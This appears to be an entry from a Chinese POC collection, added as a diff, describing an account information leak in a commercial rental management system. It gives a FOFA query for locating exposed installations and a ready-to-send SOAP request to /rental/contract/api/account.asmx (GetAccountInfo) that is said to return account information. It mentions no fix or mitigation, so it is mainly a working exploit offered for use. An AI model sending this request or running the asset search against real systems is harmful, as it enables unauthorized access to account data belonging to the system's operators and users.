@@ -1,0 +1,41 @@
+---
+fofa: "web.body="
+source: "wy876 漏洞文库"
+---
+
+# 竞优（广州）信息技术有限公司商业租赁管理系统存在account信息泄露
+
+# 一、漏洞简介
+作为地产及不动产数字化行业深耕者，三十多年来始终专注于企业管理软件的技术开发和咨询服务。我们多年对地产及不动产行业的专注投入、以及深刻理解能为企业提供专业的产品、高效的实施服务、强大的技术支持和优质的售后保障。竞优（广州）信息技术有限公司商业租赁管理系统存在account信息泄露。
+
+# 二、影响版本
++ 商业租赁管理系统
+
+# 三、资产测绘
++ fofa：`web.body="商业租赁管理系统"`
++ 特征
+
+
+# 四、漏洞复现
+```java
+POST /rental/contract/api/account.asmx HTTP/1.1
+Host: 
+Content-Type: text/xml; charset=utf-8
+Content-Length: length
+SOAPAction: "http://tempuri.org/GetAccountInfo"
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetAccountInfo xmlns="http://tempuri.org/" />
+  </soap:Body>
+</soap:Envelope>
+```
+
+
+> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uzg50h4mdksdemst>
+
+
+---
+
+> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
